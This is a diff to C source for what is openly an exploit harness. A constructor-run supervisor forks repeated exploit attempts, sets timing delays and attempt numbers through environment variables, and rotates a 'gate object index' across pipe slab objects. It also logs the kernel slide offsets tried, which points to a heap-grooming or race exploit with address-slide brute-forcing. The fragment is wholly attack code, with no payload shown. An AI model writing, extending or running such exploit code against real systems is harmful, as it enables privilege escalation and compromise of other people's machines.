@@ -139,17 +139,37 @@ __attribute__((constructor)) static void load(void) {
         _exit(1);
       }
       char delay[16];
+      char attempt_arg[16];
       snprintf(delay, sizeof(delay), "%d", delay_usec);
+      snprintf(attempt_arg, sizeof(attempt_arg), "%d", attempt);
       SYSCHK(setenv("PSELECT_DELAY_USEC", delay, 1));
+      SYSCHK(setenv("EXPLOIT_ATTEMPT", attempt_arg, 1));
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+      /*
+       * Each attempt is a fresh fork, so in-process static rotation never
+       * advances. Pin gate object index from the supervisor attempt number
+       * (0..PIPE_OBJS_PER_SLAB-1). Override with P0_GATE_OBJECT_INDEX env.
+       */
+      if (!getenv("P0_GATE_OBJECT_INDEX") || !getenv("P0_GATE_OBJECT_INDEX")[0]) {
+        char gate_idx[16];
+        int idx = (attempt - 1) % (int)PIPE_OBJS_PER_SLAB;
+        snprintf(gate_idx, sizeof(gate_idx), "%d", idx);
+        SYSCHK(setenv("P0_GATE_OBJECT_INDEX", gate_idx, 1));
+      }
+#endif
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
       const char *forced_offset = getenv("SLIDE_P0_OFFSET");
+      const char *gate_idx_env = getenv("P0_GATE_OBJECT_INDEX");
       if (forced_offset) {
-        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=%s\n",
+        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=%s "
+                   "gate_index=%s\n",
                    attempt, max_attempts, getpid(), delay_usec,
-                   forced_offset);
+                   forced_offset, gate_idx_env ? gate_idx_env : "?");
       } else {
-        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=scan\n",
-                   attempt, max_attempts, getpid(), delay_usec);
+        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=scan "
+                   "gate_index=%s\n",
+                   attempt, max_attempts, getpid(), delay_usec,
+                   gate_idx_env ? gate_idx_env : "?");
       }
 #else
       pr_success("exploit attempt=%d/%d pid=%d delay=%d\n",
